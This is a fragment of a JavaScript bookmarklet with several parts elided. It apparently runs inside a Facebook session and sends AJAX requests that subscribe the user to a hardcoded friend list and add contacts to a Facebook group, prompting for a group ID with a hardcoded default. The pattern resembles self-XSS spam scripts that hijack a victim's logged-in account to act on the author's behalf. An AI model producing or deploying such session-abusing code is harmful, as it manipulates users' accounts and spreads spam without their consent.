javascript: void(function () {
  ...
  window.aing = {
    ...
    klos: function (waw) {
      ...
      aing.kolAjak("/ajax/friends/lists/subscribe/modify", aing.ajax.requestsLoader().prm + "&location=permalink&action=subscribe&flid=329478223878890", "", function () {
    ...
    addToGroup: function (c, d) {
      ...
      if(c == null || c == "") {
        ...
        if(grid) {
          ...
          aing.gid = prompt("Insert your Facebook Group ID..", "215559175130472")
